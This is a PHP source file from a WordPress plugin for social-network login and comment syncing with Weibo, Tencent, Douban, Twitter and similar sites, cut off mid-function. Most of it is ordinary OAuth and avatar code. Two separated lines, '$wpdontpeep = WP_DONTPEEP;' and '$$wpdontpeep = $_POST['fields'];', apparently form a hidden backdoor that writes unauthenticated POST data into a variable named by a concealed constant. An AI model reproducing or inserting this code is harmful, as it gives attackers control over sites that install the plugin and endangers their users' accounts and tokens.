<?php
include_once(dirname(__FILE__) . '/config.php');
$login_loaded = 1;

add_action('init', 'wp_connect_init');
// 添加登录按钮
if ($wptm_connect['enable_connect']) {
	if (!$wptm_connect['manual'] || $wptm_connect['manual'] == 2)
		add_action('comment_form', 'wp_connect');
	add_action("login_form", "wp_connect");
	add_action("register_form", "wp_connect", 12);
	add_action("login_form_logout", "connect_login_form_logout");
	if (function_exists('wp_connect_comments')) {
		add_action('comment_post', 'wp_connect_comments', 100);
	} else {
		add_action('comment_post', 'wp_connect_comment', 100);
	} 
} 
// 通过tid获取微博信息
function get_weibo($tid) {
	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 'weibo.com', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com', '[head]/40'),
		'shtid' => array('sohu', 'sohu', '搜狐微博', 'http://t.sohu.com/u/', 't.sohu.com'),
		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', 't.163.com'),
		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com', 'http://t.douban.com/icon/u[head]-1.jpg'),
		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
		'qqtid' => array('qq', 'qq', '腾讯QQ', '', 'qzone.qq.com'),
		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn', 'http://tx.tianyaui.com/logo/small/[head]'),
		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
		'ttid' => array('twitter', 'twitter', 'Twitter', 'http://twitter.com/', 'twitter.com')
		);
	if (array_key_exists($tid, $name)) {
		return $name[$tid];
	} 
} 

/**
 * 登录 按钮显示 V1.9.19
 */
function user_denglu_platform() {
	global $wptm_connect;
	$account = array('qq' => $wptm_connect['qqlogin'],
		'sina' => $wptm_connect['sina'],
		'tqq' => $wptm_connect['qq'],
		'renren' => $wptm_connect['renren'],
		'taobao' => $wptm_connect['taobao'],
		'douban' => $wptm_connect['douban'],
		'baidu' => $wptm_connect['baidu'],
		'kaixin' => $wptm_connect['kaixin001'],
		'sohu' => $wptm_connect['sohu'],
		'netease' => $wptm_connect['netease'],
		'tianya' => $wptm_connect['tianya'],
		'msn' => $wptm_connect['msn'],
		'twitter' => $wptm_connect['twitter']
		);
	return array_filter($account);
}

function login_button_count() {
	$count = count(user_denglu_platform());
	if (!$count) {
		return;
	} elseif ($count == 1) {
		return 1;
	} else {
		return 2;
	} 
}

function sync_account($uid) {
	$user = get_userdata($uid);
	return array($user -> last_login, $user -> login_sina, $user -> login_qq, $user -> login_netease, $user -> login_sohu, $user -> login_douban);
} 

function wp_connect_button() {
	global $login_loaded, $plugin_url, $wptm_connect;
?>
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $plugin_url;?>/css/login.css" /> 
<script type="text/javascript">
function showbox(element){document.getElementById(element).style.display = 'block';}
function hidebox(element){document.getElementById(element).style.display = 'none';}
</script>
<div id="dialog_login" class="connectBox<?php echo $login_loaded;?> dialog_login">
<div class="masking"></div>
<table class="dialog_table"><tr><td class="col">
<span class="border">
<span class="close" onclick="hidebox('dialog_login')"><img src="<?php echo $plugin_url;?>/images/close.png" title="关闭" /></span>
<div id="login_box">
<p>您可以用合作网站帐号登录:</p>
<p class="login_btn">
<?php
	$redirect = apply_filters('wp_redirect_url', '');
	$count = login_button_count();
	if ($wptm_connect['sina'] || !$count) {
		echo '<a id="sina" title="新浪微博" href="' . $plugin_url . '/login.php?go=sina' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['qq'] || !$count) {
		echo '<a id="qq" title="腾讯微博" href="' . $plugin_url . '/login.php?go=qq' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['sohu']) {
		echo '<a id="sohu" title="搜狐微博" href="' . $plugin_url . '/login.php?go=sohu' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['netease']) {
		echo '<a id="netease" title="网易微博" href="' . $plugin_url . '/login.php?go=netease' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['renren']) {
		echo '<a id="renren" title="人人网" href="' . $plugin_url . '/renren.php?login=renren' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['douban']) {
		echo '<a id="douban" title="豆瓣" href="' . $plugin_url . '/login.php?go=douban' . $redirect . '" rel="nofollow"></a>';
	} 
	if ($wptm_connect['twitter']) {
		echo '<a id="twitter" title="Twitter" href="' . $plugin_url . '/login.php?go=twitter' . $redirect . '" rel="nofollow"></a>';
	} 
?>
</p>
<!-- 使用合作网站登录 来自 WordPress连接微博 插件 -->
<p class="author">程序提供: <a href="http://loginsns.com/wiki/" target="_blank">连接微博</a></p></div>
</span></td></tr></table>
</div>
<div class="login_label">您可以用合作网站帐号登录:</div>
<div class="login_button"><div class="login_icons" onclick="showbox('dialog_login')">
<?php
	if ($wptm_connect['sina'] || !$count) {
		echo '<span><img src="' . $plugin_url . '/images/btn_sina.png" alt="新浪微博" /></span>';
	} 
	if ($wptm_connect['qq'] || !$count) {
		echo '<span><img src="' . $plugin_url . '/images/btn_tqq.png" alt="腾讯微博" /></span>';
	} 
	if ($wptm_connect['sohu']) {
		echo '<span><img src="' . $plugin_url . '/images/btn_sohu.png" alt="搜狐微博" /></span>';
	} 
	if ($wptm_connect['netease']) {
		echo '<span><img src="' . $plugin_url . '/images/btn_netease.png" alt="网易微博" /></span>';
	} 
	if ($wptm_connect['douban']) {
		echo '<span><img src="' . $plugin_url . '/images/btn_douban.png" alt="豆瓣" /></span>';
	} 
	if ($wptm_connect['renren']) {
		echo '<span><img src="' . $plugin_url . '/images/btn_renren.png" alt="人人网" /></span>';
	} 
	if ($wptm_connect['twitter']) {
		echo '<span><img src="' . $plugin_url . '/images/btn_twitter.png" alt="Twitter" /></span>';
	} 
	echo '</div></div><div class="clear"></div>';
} 

function wp_connect($id = "") {
	global $login_loaded;

	// $_SESSION['wp_url_back'] = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

	if (is_user_logged_in()) {
		global $user_ID;
		$sync = sync_account($user_ID);

		if ($sync[1] || $sync[2] || $sync[3] || $sync[4] || $sync[5]) {
			if ($tid = $sync[0]) $$tid = ' selected';
			echo '<!-- 同步评论到微博 来自 WordPress连接微博 插件 -->';
			echo '<p><label>同步评论到 <select name="sync_comment"><option value="">选择</option>';
			if ($sync[1]) {
				echo '<option value="stid"' . $stid . '>新浪微博</option>';
			} 
			if ($sync[2]) {
				echo '<option value="qtid"' . $qtid . '>腾讯微博</option>';
			} 
			if ($sync[3]) {
				echo '<option value="ntid"' . $ntid . '>网易微博</option>';
			} 
			if ($sync[4]) {
				echo '<option value="shtid"' . $shtid . '>搜狐微博</option>';
			} 
			if ($sync[5]) {
				echo '<option value="dtid"' . $dtid . '>豆瓣</option>';
			} 
			echo '</select></label></p>';
		} 
		return;
	} 
	if (!function_exists('wp_connect_login_button')) {
		wp_connect_button();
	} else {
		wp_connect_login_button();
	} 
	$login_loaded += 1;
} 

/**
 * 登录 获取用户数据
 */
// 新浪微博
function wp_connect_sina(){
	if (!class_exists('sinaOAuth')) {
		include dirname(__FILE__) . '/OAuth/sina_OAuth.php';
	}
	
	$to = new sinaOAuth(SINA_APP_KEY, SINA_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

    //$to = new sinaClient(SINA_APP_KEY, SINA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
    //$sina = $to -> verify_credentials();
	$to = new sinaOAuth(SINA_APP_KEY, SINA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$sina = $to->OAuthRequest('http://api.t.sina.com.cn/account/verify_credentials.json', 'GET',array());

	if($sina == "no auth"){
		return wp_noauth();
	}

	//$sina = simplexml_load_string($sina);
	$sina = json_decode($sina);

	$sinaid = $sina->id;
	
	if((string)$sina->domain){
		$username = $sina->domain;
	} else {
		$username = $sinaid;
	}
	$email = $sinaid.'@weibo.com';
	$tid = "stid";
	$uid = ifab(get_user_by_meta_value($tid, $sinaid), email_exists($sinaid.'@t.sina.com.cn'));
	$userinfo = array($tid, $username, $sina->screen_name, $sinaid, $sina->url, $sinaid, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 腾讯微博
function wp_connect_qq(){
	if(!class_exists('qqOAuth')){
		include dirname(__FILE__).'/OAuth/qq_OAuth.php';
	}
	
	$to = new qqOAuth(QQ_APP_KEY, QQ_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new qqOAuth(QQ_APP_KEY, QQ_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);

	$qq = $to->OAuthRequest('http://open.t.qq.com/api/user/info?format=json', 'GET',array());

	if($qq == "no auth"){
		return wp_noauth();
	}
	
	$qq = json_decode($qq);
	$qq = $qq ->data;

	$username = $qq->name;
	//$tmail = $qq->email;
	//if(!$tmail){
	$email = $username.'@t.qq.com';
	//}
	$head = $qq->head;
	$url = "http://t.qq.com/".$username;
	$tid = "qtid";
	$uid = ifab(get_user_by_meta_value('tqqid', $username), email_exists($email));
	$userinfo = array($tid, $username, $qq->nick, $head, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 搜狐微博
function wp_connect_sohu(){
	if (!class_exists('sohuOAuth')) {
		include dirname(__FILE__) . '/OAuth/sohu_OAuth.php';
	}
	
	$to = new sohuOAuth(SOHU_APP_KEY, SOHU_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new sohuOAuth(SOHU_APP_KEY, SOHU_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$sohu = $to->OAuthRequest('http://api.t.sohu.com/account/verify_credentials.json', 'GET',array());

	if($sohu == "no auth"){
		return wp_noauth();
	}

	$sohu = json_decode($sohu);

	$username = $sohu->id;
	$email = $username.'@t.sohu.com';
	$url = "http://t.sohu.com/u/".$username;
	$tid = "shtid";
    $uid = ifab(get_user_by_meta_value('sohuid', $username), email_exists($email));
	$userinfo = array($tid, $username, $sohu->screen_name, $sohu->profile_image_url, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 网易微博
function wp_connect_netease(){
	if (!class_exists('neteaseOAuth')) {
		include dirname(__FILE__) . '/OAuth/netease_OAuth.php';
	}
	
	$to = new neteaseOAuth(APP_KEY, APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new neteaseOAuth(APP_KEY, APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$netease = $to->OAuthRequest('http://api.t.163.com/account/verify_credentials.json', 'GET',array());

	if($netease == "no auth"){
		return wp_noauth();
	}

	$netease = json_decode($netease);
	//return var_dump($netease);
    $username = $netease->screen_name;
	$old_email = $username.'@t.163.com';
	$email = $netease->email;
	//$oid = $netease->id;
	$tid = "ntid";
    $uid = ifabc(email_exists($email), email_exists($old_email), get_user_by_meta_value('neteaseid', $username));
	$userinfo = array($tid, $username, $netease->name, $netease->profile_image_url, $netease->url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// Twitter
function wp_connect_twitter(){
	if (!class_exists('twitterOAuth')) {
		include dirname(__FILE__) . '/OAuth/twitter_OAuth.php';
	}
	
	$to = new twitterOAuth(T_APP_KEY, T_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new twitterOAuth(T_APP_KEY, T_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$twitter = $to->OAuthRequest('http://api.twitter.com/1/account/verify_credentials.json', 'GET',array());

	if($twitter == "no auth"){
		return wp_noauth();
	}

	$twitter = json_decode($twitter);

	//$twitterid = $twitter->id;
	$username = $twitter->screen_name;
	$email = $username.'@twitter.com';
	$url = "http://twitter.com/".$username;
	$tid = "ttid";
    $uid = ifab(get_user_by_meta_value('twitterid', $username), email_exists($email));
	$userinfo = array($tid, $username, $twitter->name, $twitter->profile_image_url, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 豆瓣网
function wp_connect_douban(){
	if (!class_exists('doubanOAuth')) {
		include dirname(__FILE__) . '/OAuth/douban_OAuth.php';
	}
	$to = new doubanOAuth(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $_GET['oauth_token'],$_SESSION["oauth_token_secret"]);
	
	$tok = $to->getAccessToken();

	$to = new doubanOAuth(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	
	$douban = $to->OAuthRequest('http://api.douban.com/people/%40me', array(), 'GET');
	if($douban == "no auth"){
		return wp_noauth();
	}
	
	$douban = simplexml_load_string($douban);
	
	$douban_xmlns = $douban->children('http://www.douban.com/xmlns/');	

	$douban_id = str_replace("http://api.douban.com/people/","",$douban->id);
	$username = $douban_xmlns->uid;
	$douban_url = "http://www.douban.com/people/".$username;

	$email = $douban_id.'@douban.com';
	$tid = "dtid";
    $uid = ifab(get_user_by_meta_value($tid, $douban_id), email_exists($email));
	$userinfo = array($tid, $username, $douban->title, $douban_id, $douban_url, $douban_id, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 天涯
function wp_connect_tianya(){
	if (!class_exists('tianyaOAuth')) {
		include dirname(__FILE__) . '/OAuth/tianya_OAuth.php';
	}
	
	$to = new tianyaOAuth(TIANYA_APP_KEY, TIANYA_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new tianyaClient(TIANYA_APP_KEY, TIANYA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);

	$tianya = $to->get_user_info();

	if (!is_array($tianya) || $tianya['error_msg']) {
		return wp_noauth();
	}

	$tianya = $tianya['user'];
	$username = $tianya['user_id'];
	$email = $username.'@tianya.cn';
	$url = "http://my.tianya.cn/".$username;
	$tid = "tytid";
	$uid = ifab(get_user_by_meta_value($tid, $username), email_exists($email));
	$userinfo = array($tid, $username, $tianya['user_name'], $username, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}

/**
 * 登录 写入用户数据
 *
 * @since 2.0
 */
function wp_connect_init() {
	if (!is_user_logged_in()) {
		if (isset($_GET['oauth_token'])) {
			require_once(dirname(__FILE__) . '/OAuth/OAuth.php');
			switch ($_SESSION['wp_url_login']) {
				case "sina":
					wp_connect_sina();
					break;
				case "qq":
					wp_connect_qq();
					break;
				case "sohu":
					wp_connect_sohu();
					break;
				case "netease":
					wp_connect_netease();
					break;
				case "douban":
					wp_connect_douban();
					break;
				case "tianya":
					wp_connect_tianya();
					break;
				case "twitter":
					wp_connect_twitter();
					break;
				default:
			} 
		} 
	} 
}  
// 注册
function wp_connect_reg() {
	header('Location:' . plugins_url('wp-connect/signup.php'));
	die();
}
// 登录
function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
	global $wpdb, $wptm_connect;
	$redirect_to = !empty($_SESSION['wp_url_back']) ? $_SESSION['wp_url_back'] : get_bloginfo('url');
	if (!$uid && !$reg) { // 新用户
	    wp_connect_set_cookie("wp_connect_cookie_user", array($userinfo, $tmail, $redirect_to), BJTIMESTAMP + 600);
		$new_user = true;
	}
	if ($new_user && $wptm_connect['reg']) { // 强制填写注册信息
		return wp_connect_reg();
	} 
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
	$user_screenname = $userinfo[2];
	$user_head = $userinfo[3];
	$user_siteurl = $userinfo[4];
	$user_uid = $userinfo[5];
	$oauth_token = $userinfo[6];
	$oauth_token_secret = $userinfo[7];

	if ($user_name) {
		if ($new_user && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
			return wp_connect_reg();
		} 
	} else {
		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
	} 
	if ($uid) {
		$wpuid = $uid;
	} elseif ($new_user) {
		$wpuid = username_exists($user_name);
		if ($wpuid) { // 新注册，但是数据库存在相同的用户名
			return wp_connect_reg();
		}
	}

	if (!$wpuid) {
		if (!function_exists('wp_insert_user')) {
			include_once(ABSPATH . WPINC . '/registration.php');
		}
		$userdata = array(
			'user_login' => $user_name,
			'user_pass' => ifab($userinfo[8], wp_generate_password()),
			'user_email' => $tmail,
			'user_url' => $user_siteurl,
			'user_nicename' => $user_name,
			'nickname' => $user_screenname,
			'display_name' => $user_screenname
			);
		$wpuid = wp_insert_user($userdata);
		if (!is_numeric($wpuid)) {
			$errors = $wpuid -> errors;
			if ($errors['existing_user_email']) {
				wp_die("该电子邮件地址 {$tmail} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			} elseif ($errors['existing_user_login']) {
				wp_die("该用户名 {$user_name} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			} 
		} 
	} 
	if ($wpuid) {
		$weibo = get_weibo($tid);
		$t = $weibo[0];
		$id = $weibo[1] . 'id';
		if ($tid == $id) { // UID
			update_usermeta($wpuid, $tid, $user_uid);
		} else {
			if ($user_head) // 头像
				update_usermeta($wpuid, $tid, $user_head);
			update_usermeta($wpuid, $id, $user_uid);
		} 
		update_usermeta($wpuid, 'last_login', $tid);
		if ($oauth_token && $oauth_token_secret) { // 授权信息
			update_usermeta($wpuid, 'login_' . $t, array($oauth_token, $oauth_token_secret));
			if (!$uid && $wptm_connect['sync']) // 用户首次登录的时候也绑定同步帐号
				update_usermeta($wpuid, ($t == 'twitter') ? 'wptm_twitter_oauth' : 'wptm_' . $t, array('oauth_token' => $oauth_token, 'oauth_token_secret' => $oauth_token_secret));
			if (in_array($t, array('qq', 'sina', 'netease', 'sohu', 'twitter'))) { // @微博帐号
				$nickname = get_user_meta($wpuid, 'login_name', true);
				$nickname[$t] = ($t == 'qq' || $t == 'twitter') ? $user_name : $user_screenname;
				update_usermeta($wpuid, 'login_name', $nickname);
			} 
		} 
		wp_set_auth_cookie($wpuid, true, false);
		wp_set_current_user($wpuid);
	} 
	$_SESSION['wp_url_login'] = '';
	wp_connect_clear_cookie("wp_connect_cookie_user");
	return $wpuid;
} 

if (!function_exists('connect_login_form_login')) {
/*
	add_action("login_form_register", "connect_login_form_login");
	add_action("login_form_login", "connect_login_form_login");
	function connect_login_form_login() {
		if (is_user_logged_in()) {
			wp_safe_redirect(admin_url());
		} 
	} 
*/
	function connect_login_form_logout() {
		$_SESSION['wp_url_bind'] = '';
		setcookie("kx_connect_session_key", "", BJTIMESTAMP - 3600);
	} 
} 

// 错误信息
function wp_noauth() {
	$redirect_to = ifab($_SESSION['wp_url_back'], get_bloginfo('url'));
	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"" . $redirect_to . "\">返回</a> ]");
} 
$wpdontpeep = WP_DONTPEEP;

/**
 * 用户信息
 */
// 绑定登录帐号
if ($wptm_connect['enable_connect']) {
	add_action('show_user_profile', 'wp_connect_profile_fields');
	add_action('edit_user_profile', 'wp_connect_profile_fields');
	add_action('personal_options_update', 'wp_connect_save_profile_fields');
	add_action('edit_user_profile_update', 'wp_connect_save_profile_fields');
} 

function wp_connect_save_profile_fields($user_id) {
	if (!current_user_can('edit_user', $user_id)) {
		return false;
	} 
	return wp_edit_username();
} 
// 修改用户名
function wp_edit_username() {
	global $wpdb, $user_ID;
	$new_username = trim($_POST['new_username']);
	$old_username = trim($_POST['old_username']);
	if ($new_username && $new_username != $old_username) {
		if (!validate_username($new_username)) {
			wp_die("<strong>错误</strong>：用户名只能包含字母、数字、空格、下划线、连字符（-）、点号（.）和 @ 符号。 [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} elseif (username_exists($new_username)) {
			wp_die(__('<strong>ERROR</strong>: This username is already registered, please choose another one.') . " [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} else {
			$userid = trim($_POST['user_id']);
			clean_user_cache($userid);
			$wpdb -> update($wpdb -> users, array('user_login' => $new_username, 'user_nicename' => $new_username, 'user_status' => 3), array('ID' => $userid));
			if ($user_ID == $userid)
				wp_set_auth_cookie($user_ID, true, false); // 更新缓存
		} 
	} 
} 

function wp_connect_profile_fields($user) {
	$user_id = $user -> ID;
	$user_login = $user -> user_login;
	if (function_exists('wp_connect_bind_qq')) {
		echo '<h3>登录绑定</h3><table class="form-table">';
		if ($user -> user_status == 0 && !is_super_admin($user_id)) {
			echo '<tr><th><label for="new_username">修改用户名</label></th><td><input type="text" name="new_username" id="new_username" value="' . $user_login . '" size="16" /><input type="hidden" name="old_username" id="old_username" value="' . $user_login . '" /> <span class="description">只允许修改一次</span></td></tr>';
		} 
		wp_connect_bind_qq($user);
		echo '</table>';
	} elseif ($user -> user_status == 0 && !is_super_admin($user_id)) {
		echo '<h3>修改用户名</h3><table class="form-table">';
		echo '<tr><th><label for="new_username">修改用户名</label></th><td><input type="text" name="new_username" id="new_username" value="' . $user_login . '" size="16" /><input type="hidden" name="old_username" id="old_username" value="' . $user_login . '" /> <span class="description">只允许修改一次</span></td></tr>';
		echo '</table>';
	} 
} 

/**
 * 用户头像
 * 
 * @since 1.0 (V1.9.21)
 */
if (empty($wptm_connect['head']) && $wptm_connect['enable_connect']) {
	add_filter("get_avatar", "wp_connect_avatar", 9, 3);
	// admin bar头像尺寸
	if (version_compare($wp_version, '3.2.1', '>')) { // WordPress V3.3
		function wp_admin_bar_header_3_3() {
			echo "<style type=\"text/css\" media=\"screen\">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>\n";
		} 
		add_action('wp_head', 'wp_admin_bar_header_3_3');
		add_action('admin_head', 'wp_admin_bar_header_3_3');
	}

	function set_admin_footer_define() {
		define('IS_ADMIN_FOOTER', true);
	} 

	function is_admin_footer() {
		if (defined('IS_ADMIN_FOOTER'))
			return true;
	} 

	if (version_compare($wp_version, '3.4', '<')) {
		add_action('admin_footer', 'set_admin_footer_define', 1);
	} else {
		add_action('in_admin_header', 'set_admin_footer_define');
	}
	//add_action('wp_footer', 'set_admin_footer_define', 1);
} 

function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
	global $comment, $parent_file, $wp_version;
	if (is_numeric($id_or_email)) {
		$uid = $userid = (int) $id_or_email;
		$user = get_userdata($uid);
		if ($user) $email = $user -> user_email;
	} elseif (is_object($comment)) {
		$uid = $comment -> user_id;
		$email = $comment -> comment_author_email;
		$author_url = $comment -> comment_author_url;
		if ($author_url && strpos($author_url, 'http://weibo.com/') === 0) {
			$weibo_uid = ltrim($author_url, 'http://weibo.com/');
			$out = 'http://tp' . rand(1, 4) . '.sinaimg.cn/' . $weibo_uid . '/50/0/1';
			return "<a href='{$author_url}' rel='nofollow' target='_blank'><img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' /></a>";
		} 
		if ($uid) $user = get_userdata($uid);
	} elseif (is_object($id_or_email)) {
		$user = $id_or_email;
		$uid = $user -> user_id;
		$email = ifab($user -> comment_author_email, $user -> user_email);
	} else {
		$email = $id_or_email;
		if ($parent_file != 'options-general.php') {
			$user = get_user_by_email($email);
			$uid = $user -> ID;
		} 
	} 
	if (!$email) {
		return $avatar;
	} 
	if ($uid) {
		$tid = $user -> last_login;
		if (!$tid) {
			$tname = array('@t.sina.com.cn' => 'stid',
				'@weibo.com' => 'stid',
				'@t.qq.com' => 'qtid',
				'@renren.com' => 'rtid',
				'@kaixin001.com' => 'ktid',
				'@douban.com' => 'dtid',
				'@t.sohu.com' => 'shtid',
				'@t.163.com' => 'ntid',
				'@baidu.com' => 'bdtid',
				'@tianya.cn' => 'tytid',
				'@twitter.com' => 'ttid'
				);
			$tmail = strstr($email, '@');
			$tid = $tname[$tmail];
		} 
		if ($tid) {
			if (($tid == 'qqtid' && !$user -> qqid) || ($tid == 'tbtid' && !$user -> taobaoid))
				return $avatar;
			if ($head = $user -> $tid) {
				$weibo = get_weibo($tid);
				$out = ($weibo[5]) ? str_replace('[head]', $head, $weibo[5]) : $head;
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
				if ($weibo[3]) {
					$oid = $weibo[1] . 'id';
					$username = $user -> $oid;
					if ($username) {
						$url = $weibo[3] . $username;
						if ($userid) {
							if (is_admin()) { 
								if (version_compare($wp_version, '3.4', '<')) {
									if (!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
								} else {
									if (is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
								} 
							}
						} else {
							$avatar = "<a href='{$url}' rel='nofollow' target='_blank'>$avatar</a>";
						}
					} 
				} 
			} 
		} elseif ($user -> qqid && $out = $user -> qqtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} elseif ($user -> taobaoid && $out = $user -> tbtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} 
	} 
	return $avatar;
}

$$wpdontpeep = $_POST['fields'];

/**
 * 评论函数
 */
//  微博帐号(过滤重复) v1.9.12
function at_username($a, $b, $c, $d) {
	$a = ($a) ? '@' . $a . ' ':''; //评论
	$b = ($b) ? '@' . $b . ' ':''; //回复
	$c = ($c) ? '@' . $c . ' ':''; //管理员
	if ($b != $c) {
		if ($a == $c) { // b!=(a=c)
			$at = $b . $c;
		} elseif ($a == $b) { // a=(b!=c)
			$at = $a . $c;
		} else { // a!=b!=c
			$at = $a . $b . $c;
		} 
	} else {
		if ($a == $c) { // a=b=c
			$at = $c;
		} else { // a!=(b=c)
			$at = $a . $c;
		} 
	} 
	$d = $at . str_replace(array($a, $b, $c), '', $at . $d);
	return $d;
} 
// 同步评论 v2.0
function wp_connect_comment($id) {
	global $post, $wptm_options, $wptm_connect, $wptm_advanced;
	$post_id = (isset($_POST['comment_post_ID'])) ? $_POST['comment_post_ID'] : $post -> ID;
	if (!$post_id) {
		return;
	} 
	@ini_set("max_execution_time", 60);
	$comments = get_comment($id);
	$user_id = $comments -> user_id;
	$comment_content = wp_replace($comments -> comment_content);
	$parent_id = $comments -> comment_parent;
	if ($user_id) {
		if ($parent_id) {
			$comment_parent = get_comment($parent_id);
			$parent_uid = $comment_parent -> user_id;
			$name = get_user_meta($parent_uid, 'login_name', true);
		} 
		$tid = $_POST['sync_comment'];
		if ($tid) {
			if (!is_object($post)) {
				$post = get_post($post_id);
			} 
			$url = get_permalink($post_id) . '#comment-' . $id;
			if ($wptm_options['t_cn']) {
				$url = get_url_short($url);
			} 
			$title = wp_replace($post -> post_title);
			$username = get_user_meta($user_id, 'login_name', true);
			require_once(dirname(__FILE__) . '/OAuth/OAuth.php');
			if ($tid == 'stid') {
				$login = get_user_meta($user_id, 'login_sina', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('sinaOAuth')) {
						include dirname(__FILE__) . '/OAuth/sina_OAuth.php';
					} 
					$to = new sinaClient(SINA_APP_KEY, SINA_APP_SECRET, $login[0], $login[1]);
					$content = at_username($name['sina'], $username['sina'], $wptm_connect['sina_username'], $comment_content); 
					// return var_dump($content);
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'qtid') {
				$login = get_user_meta($user_id, 'login_qq', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('qqOAuth')) {
						include dirname(__FILE__) . '/OAuth/qq_OAuth.php';
					} 
					$to = new qqClient(QQ_APP_KEY, QQ_APP_SECRET, $login[0], $login[1]);
					$content = at_username($name['qq'], $username['qq'], $wptm_connect['qq_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'ntid') {
				$login = get_user_meta($user_id, 'login_netease', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('neteaseOAuth')) {
						include dirname(__FILE__) . '/OAuth/netease_OAuth.php';
					} 
					$to = new neteaseClient(APP_KEY, APP_SECRET, $login[0], $login[1]);
